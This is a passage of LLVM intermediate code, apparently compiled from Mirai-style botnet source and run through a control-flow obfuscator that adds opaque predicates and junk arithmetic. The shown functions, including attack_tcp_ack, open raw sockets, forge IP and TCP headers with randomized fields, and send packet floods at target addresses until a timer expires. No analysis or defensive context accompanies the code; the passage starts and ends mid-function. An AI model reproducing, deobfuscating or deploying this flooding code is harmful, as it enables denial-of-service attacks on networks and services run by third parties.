  %520 = call i64 @sendto(i32 %509, i8* %510, i64 60, i32 16384, %struct.sockaddr* %519, i32 16)
  br label %521

; <label>:521:                                    ; preds = %483
  %522 = load i32, i32* %11, align 4
  %523 = add nsw i32 %522, 1
  store i32 %523, i32* %11, align 4
  br label %314

; <label>:524:                                    ; preds = %314
  %525 = call i64 @time(i64* null) #6
  %526 = load i32, i32* %29, align 4
  %527 = sext i32 %526 to i64
  %528 = icmp sgt i64 %525, %527
  br i1 %528, label %529, label %530

; <label>:529:                                    ; preds = %524
  br label %547

; <label>:530:                                    ; preds = %524
  %531 = load i32, i32* @x.21
  %532 = load i32, i32* @y.22
  %533 = sub i32 %531, 1
  %534 = mul i32 %531, %533
  %535 = urem i32 %534, 2
  %536 = icmp eq i32 %535, 0
  %537 = icmp slt i32 %532, 10
  %538 = or i1 %536, %537
  br i1 %538, label %originalBB199, label %originalBB199alteredBB

originalBB199:                                    ; preds = %originalBB199alteredBB, %530
  %539 = load i32, i32* @x.21
  %540 = load i32, i32* @y.22
  %541 = sub i32 %539, 1
  %542 = mul i32 %539, %541
  %543 = urem i32 %542, 2
  %544 = icmp eq i32 %543, 0
  %545 = icmp slt i32 %540, 10
  %546 = or i1 %544, %545
  br i1 %546, label %originalBBpart2201, label %originalBB199alteredBB

originalBBpart2201:                               ; preds = %originalBB199
  br label %313

; <label>:547:                                    ; preds = %529, %112, %106
  %548 = load i32, i32* @x.21
  %549 = load i32, i32* @y.22
  %550 = sub i32 %548, 1
  %551 = mul i32 %548, %550
  %552 = urem i32 %551, 2
  %553 = icmp eq i32 %552, 0
  %554 = icmp slt i32 %549, 10
  %555 = or i1 %553, %554
  br i1 %555, label %originalBB203, label %originalBB203alteredBB

originalBB203:                                    ; preds = %originalBB203alteredBB, %547
  %556 = load i32, i32* @x.21
  %557 = load i32, i32* @y.22
  %558 = sub i32 %556, 1
  %559 = mul i32 %556, %558
  %560 = urem i32 %559, 2
  %561 = icmp eq i32 %560, 0
  %562 = icmp slt i32 %557, 10
  %563 = or i1 %561, %562
  br i1 %563, label %originalBBpart2205, label %originalBB203alteredBB

originalBBpart2205:                               ; preds = %originalBB203
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %168
  %564 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %565 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %564, i32 0, i32 6
  store i8 6, i8* %565, align 1
  %566 = load i32, i32* %28, align 4
  %567 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %568 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %567, i32 0, i32 8
  store i32 %566, i32* %568, align 4
  %569 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %570 = load i32, i32* %11, align 4
  %571 = sext i32 %570 to i64
  %572 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %569, i64 %571
  %573 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %572, i32 0, i32 1
  %574 = load i32, i32* %573, align 4
  %575 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %576 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %575, i32 0, i32 9
  store i32 %574, i32* %576, align 4
  %577 = load i16, i16* %18, align 2
  %578 = call zeroext i16 @htons(i16 zeroext %577) #7
  %579 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %580 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %579, i32 0, i32 0
  store i16 %578, i16* %580, align 4
  %581 = load i16, i16* %19, align 2
  %582 = call zeroext i16 @htons(i16 zeroext %581) #7
  %583 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %584 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %583, i32 0, i32 1
  store i16 %582, i16* %584, align 2
  %585 = load i32, i32* %20, align 4
  %586 = trunc i32 %585 to i16
  %587 = call zeroext i16 @htons(i16 zeroext %586) #7
  %588 = zext i16 %587 to i32
  %589 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %590 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %589, i32 0, i32 2
  store i32 %588, i32* %590, align 4
  %591 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %592 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %591, i32 0, i32 4
  %593 = load i16, i16* %592, align 4
  %_ = sub i16 0, %593
  %gen = add i16 %_, -241
  %_1 = sub i16 %593, -241
  %gen2 = mul i16 %_1, -241
  %_3 = sub i16 0, %593
  %gen4 = add i16 %_3, -241
  %_5 = shl i16 %593, -241
  %_6 = shl i16 %593, -241
  %_7 = sub i16 0, %593
  %gen8 = add i16 %_7, -241
  %594 = and i16 %593, -241
  %_9 = sub i16 %594, 160
  %gen10 = mul i16 %_9, 160
  %_11 = sub i16 %594, 160
  %gen12 = mul i16 %_11, 160
  %_13 = sub i16 %594, 160
  %gen14 = mul i16 %_13, 160
  %_15 = sub i16 0, %594
  %gen16 = add i16 %_15, 160
  %595 = or i16 %594, 160
  store i16 %595, i16* %592, align 4
  %596 = load i8, i8* %22, align 1
  %597 = sext i8 %596 to i16
  %598 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %599 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %598, i32 0, i32 4
  %600 = load i16, i16* %599, align 4
  %_17 = shl i16 %597, 1
  %_18 = shl i16 %597, 1
  %_19 = sub i16 %597, 1
  %gen20 = mul i16 %_19, 1
  %_21 = sub i16 %597, 1
  %gen22 = mul i16 %_21, 1
  %601 = and i16 %597, 1
  %_23 = sub i16 %601, 13
  %gen24 = mul i16 %_23, 13
  %_25 = shl i16 %601, 13
  %_26 = sub i16 0, %601
  %gen27 = add i16 %_26, 13
  %_28 = sub i16 0, %601
  %gen29 = add i16 %_28, 13
  %_30 = sub i16 %601, 13
  %gen31 = mul i16 %_30, 13
  %602 = shl i16 %601, 13
  %_32 = sub i16 %600, -8193
  %gen33 = mul i16 %_32, -8193
  %_34 = shl i16 %600, -8193
  %_35 = shl i16 %600, -8193
  %_36 = sub i16 %600, -8193
  %gen37 = mul i16 %_36, -8193
  %_38 = sub i16 0, %600
  %gen39 = add i16 %_38, -8193
  %_40 = sub i16 0, %600
  %gen41 = add i16 %_40, -8193
  %603 = and i16 %600, -8193
  %_42 = sub i16 %603, %602
  %gen43 = mul i16 %_42, %602
  %_44 = sub i16 %603, %602
  %gen45 = mul i16 %_44, %602
  %_46 = sub i16 0, %603
  %gen47 = add i16 %_46, %602
  %_48 = shl i16 %603, %602
  %_49 = shl i16 %603, %602
  %_50 = sub i16 %603, %602
  %gen51 = mul i16 %_50, %602
  %604 = or i16 %603, %602
  store i16 %604, i16* %599, align 4
  %605 = load i8, i8* %23, align 1
  %606 = sext i8 %605 to i16
  %607 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %608 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %607, i32 0, i32 4
  %609 = load i16, i16* %608, align 4
  %_52 = shl i16 %606, 1
  %_53 = shl i16 %606, 1
  %_54 = sub i16 0, %606
  %gen55 = add i16 %_54, 1
  %610 = and i16 %606, 1
  %_56 = sub i16 %610, 12
  %gen57 = mul i16 %_56, 12
  %611 = shl i16 %610, 12
  %_58 = sub i16 %609, -4097
  %gen59 = mul i16 %_58, -4097
  %612 = and i16 %609, -4097
  %_60 = sub i16 %612, %611
  %gen61 = mul i16 %_60, %611
  %_62 = sub i16 %612, %611
  %gen63 = mul i16 %_62, %611
  %613 = or i16 %612, %611
  store i16 %613, i16* %608, align 4
  %614 = load i8, i8* %24, align 1
  %615 = sext i8 %614 to i16
  %616 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %617 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %616, i32 0, i32 4
  %618 = load i16, i16* %617, align 4
  %_64 = sub i16 0, %615
  %gen65 = add i16 %_64, 1
  %619 = and i16 %615, 1
  %_66 = sub i16 %619, 11
  %gen67 = mul i16 %_66, 11
  %_68 = shl i16 %619, 11
  %_69 = sub i16 0, %619
  %gen70 = add i16 %_69, 11
  %_71 = shl i16 %619, 11
  %_72 = shl i16 %619, 11
  %_73 = sub i16 %619, 11
  %gen74 = mul i16 %_73, 11
  %_75 = sub i16 %619, 11
  %gen76 = mul i16 %_75, 11
  %_77 = sub i16 %619, 11
  %gen78 = mul i16 %_77, 11
  %620 = shl i16 %619, 11
  %_79 = sub i16 %618, -2049
  %gen80 = mul i16 %_79, -2049
  %621 = and i16 %618, -2049
  %_81 = sub i16 %621, %620
  %gen82 = mul i16 %_81, %620
  %_83 = sub i16 0, %621
  %gen84 = add i16 %_83, %620
  %_85 = sub i16 0, %621
  %gen86 = add i16 %_85, %620
  %_87 = sub i16 %621, %620
  %gen88 = mul i16 %_87, %620
  %_89 = sub i16 %621, %620
  %gen90 = mul i16 %_89, %620
  %622 = or i16 %621, %620
  store i16 %622, i16* %617, align 4
  %623 = load i8, i8* %25, align 1
  %624 = sext i8 %623 to i16
  %625 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %626 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %625, i32 0, i32 4
  %627 = load i16, i16* %626, align 4
  %_91 = shl i16 %624, 1
  %628 = and i16 %624, 1
  %_92 = shl i16 %628, 10
  %_93 = sub i16 0, %628
  %gen94 = add i16 %_93, 10
  %_95 = shl i16 %628, 10
  %_96 = shl i16 %628, 10
  %_97 = sub i16 0, %628
  %gen98 = add i16 %_97, 10
  %_99 = sub i16 %628, 10
  %gen100 = mul i16 %_99, 10
  %629 = shl i16 %628, 10
  %_101 = sub i16 %627, -1025
  %gen102 = mul i16 %_101, -1025
  %_103 = sub i16 %627, -1025
  %gen104 = mul i16 %_103, -1025
  %_105 = sub i16 %627, -1025
  %gen106 = mul i16 %_105, -1025
  %_107 = shl i16 %627, -1025
  %630 = and i16 %627, -1025
  %_108 = shl i16 %630, %629
  %_109 = sub i16 %630, %629
  %gen110 = mul i16 %_109, %629
  %_111 = shl i16 %630, %629
  %631 = or i16 %630, %629
  store i16 %631, i16* %626, align 4
  %632 = load i8, i8* %26, align 1
  %633 = sext i8 %632 to i16
  %634 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %635 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %634, i32 0, i32 4
  %636 = load i16, i16* %635, align 4
  %_112 = shl i16 %633, 1
  %_113 = shl i16 %633, 1
  %_114 = shl i16 %633, 1
  %_115 = shl i16 %633, 1
  %_116 = sub i16 %633, 1
  %gen117 = mul i16 %_116, 1
  %637 = and i16 %633, 1
  %_118 = sub i16 %637, 9
  %gen119 = mul i16 %_118, 9
  %_120 = sub i16 0, %637
  %gen121 = add i16 %_120, 9
  %_122 = sub i16 0, %637
  %gen123 = add i16 %_122, 9
  %_124 = shl i16 %637, 9
  %_125 = shl i16 %637, 9
  %_126 = sub i16 %637, 9
  %gen127 = mul i16 %_126, 9
  %_128 = sub i16 %637, 9
  %gen129 = mul i16 %_128, 9
  %638 = shl i16 %637, 9
  %_130 = shl i16 %636, -513
  %_131 = shl i16 %636, -513
  %_132 = sub i16 0, %636
  %gen133 = add i16 %_132, -513
  %_134 = sub i16 %636, -513
  %gen135 = mul i16 %_134, -513
  %639 = and i16 %636, -513
  %_136 = sub i16 0, %639
  %gen137 = add i16 %_136, %638
  %640 = or i16 %639, %638
  store i16 %640, i16* %635, align 4
  %641 = load i8, i8* %27, align 1
  %642 = sext i8 %641 to i16
  %643 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %644 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %643, i32 0, i32 4
  %645 = load i16, i16* %644, align 4
  %_138 = sub i16 %642, 1
  %gen139 = mul i16 %_138, 1
  %_140 = sub i16 0, %642
  %gen141 = add i16 %_140, 1
  %_142 = sub i16 %642, 1
  %gen143 = mul i16 %_142, 1
  %_144 = sub i16 %642, 1
  %gen145 = mul i16 %_144, 1
  %_146 = shl i16 %642, 1
  %646 = and i16 %642, 1
  %647 = shl i16 %646, 8
  %_147 = shl i16 %645, -257
  %648 = and i16 %645, -257
  %_148 = sub i16 %648, %647
  %gen149 = mul i16 %_148, %647
  %_150 = sub i16 %648, %647
  %gen151 = mul i16 %_150, %647
  %649 = or i16 %648, %647
  store i16 %649, i16* %644, align 4
  %650 = load i8*, i8** %32, align 8
  %651 = getelementptr inbounds i8, i8* %650, i32 1
  store i8* %651, i8** %32, align 8
  store i8 2, i8* %650, align 1
  %652 = load i8*, i8** %32, align 8
  %653 = getelementptr inbounds i8, i8* %652, i32 1
  store i8* %653, i8** %32, align 8
  store i8 4, i8* %652, align 1
  %654 = call i32 @rand_next()
  %_152 = sub i32 0, %654
  %gen153 = add i32 %_152, 15
  %_154 = sub i32 %654, 15
  %gen155 = mul i32 %_154, 15
  %_156 = sub i32 0, %654
  %gen157 = add i32 %_156, 15
  %_158 = shl i32 %654, 15
  %_159 = sub i32 %654, 15
  %gen160 = mul i32 %_159, 15
  %655 = and i32 %654, 15
  %_161 = sub i32 0, 1400
  %gen162 = add i32 %_161, %655
  %_163 = shl i32 1400, %655
  %_164 = sub i32 0, 1400
  %gen165 = add i32 %_164, %655
  %_166 = shl i32 1400, %655
  %656 = add i32 1400, %655
  %657 = trunc i32 %656 to i16
  %658 = call zeroext i16 @htons(i16 zeroext %657) #7
  %659 = load i8*, i8** %32, align 8
  %660 = bitcast i8* %659 to i16*
  store i16 %658, i16* %660, align 2
  %661 = load i8*, i8** %32, align 8
  %662 = getelementptr inbounds i8, i8* %661, i64 2
  store i8* %662, i8** %32, align 8
  %663 = load i8*, i8** %32, align 8
  %664 = getelementptr inbounds i8, i8* %663, i32 1
  store i8* %664, i8** %32, align 8
  store i8 4, i8* %663, align 1
  %665 = load i8*, i8** %32, align 8
  %666 = getelementptr inbounds i8, i8* %665, i32 1
  store i8* %666, i8** %32, align 8
  store i8 2, i8* %665, align 1
  %667 = load i8*, i8** %32, align 8
  %668 = getelementptr inbounds i8, i8* %667, i32 1
  store i8* %668, i8** %32, align 8
  store i8 8, i8* %667, align 1
  %669 = load i8*, i8** %32, align 8
  %670 = getelementptr inbounds i8, i8* %669, i32 1
  store i8* %670, i8** %32, align 8
  store i8 10, i8* %669, align 1
  %671 = call i32 @rand_next()
  %672 = load i8*, i8** %32, align 8
  %673 = bitcast i8* %672 to i32*
  store i32 %671, i32* %673, align 4
  %674 = load i8*, i8** %32, align 8
  %675 = getelementptr inbounds i8, i8* %674, i64 4
  store i8* %675, i8** %32, align 8
  %676 = load i8*, i8** %32, align 8
  %677 = bitcast i8* %676 to i32*
  store i32 0, i32* %677, align 4
  %678 = load i8*, i8** %32, align 8
  %679 = getelementptr inbounds i8, i8* %678, i64 4
  store i8* %679, i8** %32, align 8
  %680 = load i8*, i8** %32, align 8
  %681 = getelementptr inbounds i8, i8* %680, i32 1
  store i8* %681, i8** %32, align 8
  store i8 1, i8* %680, align 1
  %682 = load i8*, i8** %32, align 8
  %683 = getelementptr inbounds i8, i8* %682, i32 1
  store i8* %683, i8** %32, align 8
  store i8 3, i8* %682, align 1
  %684 = load i8*, i8** %32, align 8
  %685 = getelementptr inbounds i8, i8* %684, i32 1
  store i8* %685, i8** %32, align 8
  store i8 3, i8* %684, align 1
  %686 = load i8*, i8** %32, align 8
  %687 = getelementptr inbounds i8, i8* %686, i32 1
  store i8* %687, i8** %32, align 8
  store i8 6, i8* %686, align 1
  br label %originalBB

originalBB167alteredBB:                           ; preds = %originalBB167, %319
  %688 = load i8**, i8*** %13, align 8
  %689 = load i32, i32* %11, align 4
  %690 = sext i32 %689 to i64
  %691 = getelementptr inbounds i8*, i8** %688, i64 %690
  %692 = load i8*, i8** %691, align 8
  store i8* %692, i8** %33, align 8
  %693 = load i8*, i8** %33, align 8
  %694 = bitcast i8* %693 to %struct.iphdr*
  store %struct.iphdr* %694, %struct.iphdr** %34, align 8
  %695 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %696 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %695, i64 1
  %697 = bitcast %struct.iphdr* %696 to %struct.tcphdr*
  store %struct.tcphdr* %697, %struct.tcphdr** %35, align 8
  %698 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %699 = load i32, i32* %11, align 4
  %700 = sext i32 %699 to i64
  %701 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %698, i64 %700
  %702 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %701, i32 0, i32 2
  %703 = load i8, i8* %702, align 4
  %704 = zext i8 %703 to i32
  %705 = icmp slt i32 %704, 32
  br label %originalBB167

originalBB171alteredBB:                           ; preds = %originalBB171, %386
  %706 = call i32 @rand_next()
  %_172 = sub i32 %706, 65535
  %gen173 = mul i32 %_172, 65535
  %_174 = sub i32 %706, 65535
  %gen175 = mul i32 %_174, 65535
  %_176 = sub i32 %706, 65535
  %gen177 = mul i32 %_176, 65535
  %707 = and i32 %706, 65535
  %708 = trunc i32 %707 to i16
  %709 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %710 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %709, i32 0, i32 3
  store i16 %708, i16* %710, align 4
  br label %originalBB171

originalBB181alteredBB:                           ; preds = %originalBB181, %422
  %711 = call i32 @rand_next()
  %_182 = shl i32 %711, 65535
  %_183 = shl i32 %711, 65535
  %_184 = sub i32 0, %711
  %gen185 = add i32 %_184, 65535
  %_186 = shl i32 %711, 65535
  %_187 = sub i32 %711, 65535
  %gen188 = mul i32 %_187, 65535
  %_189 = sub i32 0, %711
  %gen190 = add i32 %_189, 65535
  %_191 = shl i32 %711, 65535
  %712 = and i32 %711, 65535
  %713 = trunc i32 %712 to i16
  %714 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %715 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %714, i32 0, i32 1
  store i16 %713, i16* %715, align 2
  br label %originalBB181

originalBB195alteredBB:                           ; preds = %originalBB195, %458
  %716 = load i8, i8* %22, align 1
  %717 = icmp ne i8 %716, 0
  br label %originalBB195

originalBB199alteredBB:                           ; preds = %originalBB199, %530
  br label %originalBB199

originalBB203alteredBB:                           ; preds = %originalBB203, %547
  br label %originalBB203
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = load i32, i32* @x.23
  %7 = load i32, i32* @y.24
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca i32, align 4
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_target*, align 8
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_option*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8**, align 8
  %22 = alloca i8, align 1
  %23 = alloca i16, align 2
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i16, align 2
  %27 = alloca i16, align 2
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8, align 1
  %31 = alloca i8, align 1
  %32 = alloca i8, align 1
  %33 = alloca i8, align 1
  %34 = alloca i8, align 1
  %35 = alloca i8, align 1
  %36 = alloca i32, align 4
  %37 = alloca i8, align 1
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca i8*, align 8
  %44 = alloca %struct.iphdr*, align 8
  %45 = alloca %struct.tcphdr*, align 8
  %46 = alloca i8*, align 8
  %47 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %14, align 4
  store i8 %1, i8* %15, align 1
  store %struct.attack_target* %2, %struct.attack_target** %16, align 8
  store i8 %3, i8* %17, align 1
  store %struct.attack_option* %4, %struct.attack_option** %18, align 8
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %48 = load i8, i8* %15, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %21, align 8
  %52 = load i8, i8* %17, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %22, align 1
  %56 = load i8, i8* %17, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %23, align 2
  %60 = load i8, i8* %17, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %24, align 1
  %64 = load i8, i8* %17, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 0)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %25, align 1
  %68 = load i8, i8* %17, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 6, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %26, align 2
  %72 = load i8, i8* %17, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 7, i32 65535)
  %75 = trunc i32 %74 to i16
  store i16 %75, i16* %27, align 2
  %76 = load i8, i8* %17, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 16, i32 65535)
  store i32 %78, i32* %28, align 4
  %79 = load i8, i8* %17, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 17, i32 65535)
  store i32 %81, i32* %29, align 4
  %82 = load i8, i8* %17, align 1
  %83 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %84 = call i32 @attack_get_opt_int(i8 zeroext %82, %struct.attack_option* %83, i8 zeroext 10, i32 0)
  %85 = trunc i32 %84 to i8
  store i8 %85, i8* %30, align 1
  %86 = load i8, i8* %17, align 1
  %87 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %88 = call i32 @attack_get_opt_int(i8 zeroext %86, %struct.attack_option* %87, i8 zeroext 11, i32 1)
  %89 = trunc i32 %88 to i8
  store i8 %89, i8* %31, align 1
  %90 = load i8, i8* %17, align 1
  %91 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %92 = call i32 @attack_get_opt_int(i8 zeroext %90, %struct.attack_option* %91, i8 zeroext 12, i32 0)
  %93 = trunc i32 %92 to i8
  store i8 %93, i8* %32, align 1
  %94 = load i8, i8* %17, align 1
  %95 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %96 = call i32 @attack_get_opt_int(i8 zeroext %94, %struct.attack_option* %95, i8 zeroext 13, i32 0)
  %97 = trunc i32 %96 to i8
  store i8 %97, i8* %33, align 1
  %98 = load i8, i8* %17, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 14, i32 0)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %34, align 1
  %102 = load i8, i8* %17, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %104 = call i32 @attack_get_opt_int(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 15, i32 0)
  %105 = trunc i32 %104 to i8
  store i8 %105, i8* %35, align 1
  %106 = load i8, i8* %17, align 1
  %107 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %108 = call i32 @attack_get_opt_int(i8 zeroext %106, %struct.attack_option* %107, i8 zeroext 0, i32 512)
  store i32 %108, i32* %36, align 4
  %109 = load i8, i8* %17, align 1
  %110 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %111 = call i32 @attack_get_opt_int(i8 zeroext %109, %struct.attack_option* %110, i8 zeroext 1, i32 1)
  %112 = trunc i32 %111 to i8
  store i8 %112, i8* %37, align 1
  %113 = load i8, i8* %17, align 1
  %114 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %115 = load i32, i32* @LOCAL_ADDR, align 4
  %116 = call i32 @attack_get_opt_ip(i8 zeroext %113, %struct.attack_option* %114, i8 zeroext 19, i32 %115)
  store i32 %116, i32* %38, align 4
  %117 = call i64 @time(i64* null) #6
  %118 = load i32, i32* %14, align 4
  %119 = sext i32 %118 to i64
  %120 = add nsw i64 %117, %119
  %121 = trunc i64 %120 to i32
  store i32 %121, i32* %39, align 4
  %122 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %122, i32* %20, align 4
  %123 = icmp eq i32 %122, -1
  %124 = load i32, i32* @x.23
  %125 = load i32, i32* @y.24
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %123, label %132, label %133

; <label>:132:                                    ; preds = %originalBBpart2
  br label %590

; <label>:133:                                    ; preds = %originalBBpart2
  store i32 1, i32* %19, align 4
  %134 = load i32, i32* %20, align 4
  %135 = bitcast i32* %19 to i8*
  %136 = call i32 @setsockopt(i32 %134, i32 0, i32 3, i8* %135, i32 4) #6
  %137 = icmp eq i32 %136, -1
  br i1 %137, label %138, label %157

; <label>:138:                                    ; preds = %133
  %139 = load i32, i32* @x.23
  %140 = load i32, i32* @y.24
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB3, label %originalBB3alteredBB

originalBB3:                                      ; preds = %originalBB3alteredBB, %138
  %147 = load i32, i32* %20, align 4
  %148 = call i32 @close(i32 %147)
  %149 = load i32, i32* @x.23
  %150 = load i32, i32* @y.24
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart25, label %originalBB3alteredBB

originalBBpart25:                                 ; preds = %originalBB3
  br label %590

; <label>:157:                                    ; preds = %133
  store i32 0, i32* %19, align 4
  br label %158

; <label>:158:                                    ; preds = %originalBBpart2236, %157
  %159 = load i32, i32* %19, align 4
  %160 = load i8, i8* %15, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp slt i32 %159, %161
  br i1 %162, label %163, label %372

; <label>:163:                                    ; preds = %158
  %164 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %165 = load i8**, i8*** %21, align 8
  %166 = load i32, i32* %19, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds i8*, i8** %165, i64 %167
  store i8* %164, i8** %168, align 8
  %169 = load i8**, i8*** %21, align 8
  %170 = load i32, i32* %19, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds i8*, i8** %169, i64 %171
  %173 = load i8*, i8** %172, align 8
  %174 = bitcast i8* %173 to %struct.iphdr*
  store %struct.iphdr* %174, %struct.iphdr** %40, align 8
  %175 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i64 1
  %177 = bitcast %struct.iphdr* %176 to %struct.tcphdr*
  store %struct.tcphdr* %177, %struct.tcphdr** %41, align 8
  %178 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %179 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %178, i64 1
  %180 = bitcast %struct.tcphdr* %179 to i8*
  store i8* %180, i8** %42, align 8
  %181 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %182 = bitcast %struct.iphdr* %181 to i8*
  %183 = load i8, i8* %182, align 4
  %184 = and i8 %183, 15
  %185 = or i8 %184, 64
  store i8 %185, i8* %182, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %187 = bitcast %struct.iphdr* %186 to i8*
  %188 = load i8, i8* %187, align 4
  %189 = and i8 %188, -16
  %190 = or i8 %189, 5
  store i8 %190, i8* %187, align 4
  %191 = load i8, i8* %22, align 1
  %192 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 1
  store i8 %191, i8* %193, align 1
  %194 = load i32, i32* %36, align 4
  %195 = sext i32 %194 to i64
  %196 = add i64 40, %195
  %197 = trunc i64 %196 to i16
  %198 = call zeroext i16 @htons(i16 zeroext %197) #7
  %199 = load %struct.iphdr*, %struct.iphdr** %40, align 8
